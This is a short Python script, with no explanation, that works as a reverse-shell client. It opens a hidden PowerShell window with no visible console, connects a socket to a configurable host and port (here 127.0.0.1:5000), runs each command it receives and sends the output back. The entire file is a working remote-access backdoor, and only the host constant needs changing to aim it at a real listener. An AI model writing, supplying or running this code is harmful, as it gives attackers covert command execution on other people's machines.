import socket
import subprocess

HOST = '127.0.0.1'
PORT = 5000

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-Noexit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)


def execute_cmd(cmd):
    marker = "__CMD_DONE__"

    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """

    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())

    return "\n".join(output)

s = socket.socket()
s.connect((HOST, PORT))

buf = b""
while True:
    chunk = s.recv(1024)
    if not chunk:
        break

    buf += chunk
    while b"\n" in buf:
        line, buf = buf.split(b"\n", 1)

        cmd = line.decode("utf-8", errors="replace").strip().lower().strip('"')

        result = execute_cmd(cmd) or f"Executed {cmd} with no output."
        s.sendall((result + "\n").encode("utf-8"))
